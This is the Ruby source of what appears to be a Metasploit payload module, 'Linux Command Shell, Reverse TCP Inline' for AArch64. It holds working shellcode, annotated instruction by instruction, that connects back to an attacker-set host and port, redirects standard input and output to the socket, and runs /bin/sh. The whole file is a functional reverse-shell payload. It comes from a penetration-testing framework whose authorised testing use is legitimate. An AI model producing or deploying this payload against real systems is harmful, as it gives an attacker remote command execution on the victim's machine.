##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 152

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_AARCH64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 132, 'ADDR' ],
              'LPORT'    => [ 130, 'n' ],
            },
          'Payload' =>
            [
            # Generated from external/source/shellcode/linux/aarch64/single_reverse_tcp_shell.s
            0xd2800040,          #  mov	x0, #0x2                   	// #2
            0xd2800021,          #  mov	x1, #0x1                   	// #1
            0xd2800002,          #  mov	x2, #0x0                   	// #0
            0xd28018c8,          #  mov	x8, #0xc6                  	// #198
            0xd4000001,          #  svc	#0x0
            0xaa0003e3,          #  mov	x3, x0
            0x10000341,          #  adr	x1, 80 <sockaddr>
            0xd2800202,          #  mov	x2, #0x10                  	// #16
            0xd2801968,          #  mov	x8, #0xcb                  	// #203
            0xd4000001,          #  svc	#0x0
            0x35000260,          #  cbnz	w0, 74 <exit>
            0xaa0303e0,          #  mov	x0, x3
            0xd2800002,          #  mov	x2, #0x0                   	// #0
            0xd2800001,          #  mov	x1, #0x0                   	// #0
            0xd2800308,          #  mov	x8, #0x18                  	// #24
            0xd4000001,          #  svc	#0x0
            0xd2800021,          #  mov	x1, #0x1                   	// #1
            0xd2800308,          #  mov	x8, #0x18                  	// #24
            0xd4000001,          #  svc	#0x0
            0xd2800041,          #  mov	x1, #0x2                   	// #2
            0xd2800308,          #  mov	x8, #0x18                  	// #24
            0xd4000001,          #  svc	#0x0
            0x10000180,          #  adr	x0, 88 <shell>
            0xd2800002,          #  mov	x2, #0x0                   	// #0
            0xf90003e0,          #  str	x0, [sp]
            0xf90007e2,          #  str	x2, [sp,#8]
            0x910003e1,          #  mov	x1, sp
            0xd2801ba8,          #  mov	x8, #0xdd                  	// #221
            0xd4000001,          #  svc	#0x0
            0xd2800000,          #  mov	x0, #0x0                   	// #0
            0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
            0xd4000001,          #  svc	#0x0
            0x5c110002,          #  .word	0x5c110002
            0x0100007f,          #  .word	0x0100007f
            0x00000000,          #  .word	0x00000000                // shell
            0x00000000,          #  .word	0x00000000
            0x00000000,          #  .word	0x00000000
            0x00000000,          #  .word	0x00000000
            ].pack("V*")
        }
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('SHELL', [ true, "The shell to execute.", "/bin/sh" ]),
      ])
  end

  def generate
    p = super

    sh = datastore['SHELL']
    if sh.length >= 16
      raise ArgumentError, "The specified shell must be less than 16 bytes."
    end
    p[136, sh.length] = sh

    p
  end
end
